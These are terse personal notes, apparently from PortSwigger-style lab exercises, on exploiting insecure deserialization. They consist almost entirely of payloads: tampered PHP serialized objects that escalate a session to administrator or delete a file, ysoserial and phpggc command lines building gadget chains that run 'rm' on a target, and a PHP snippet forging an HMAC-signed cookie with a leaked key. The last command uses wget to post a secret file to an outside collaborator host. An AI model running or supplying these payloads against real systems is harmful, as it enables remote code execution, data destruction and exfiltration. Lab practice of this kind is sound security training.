modify session >> b:0 > 1
change s:6:"wiener" > s:12:"administrator" || s:0 > i:0
```deleteaccount
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
POST /my-account/delete
```
view sitemap >> ~ (php)
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Apache
```Example
java \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ -jar ysoserial-all.jar [payload] '[command]'
```
```
java \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

```fix
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
**Php > phpinfo.php > secretkey
```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
```
<?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
```


```base64+gzip
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 'wget http://Burp-collab.oastify.com --post-file=/home/carlos/secret' | gzip | base64 -w 0 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote_plus(sys.stdin.read().strip()))"
```
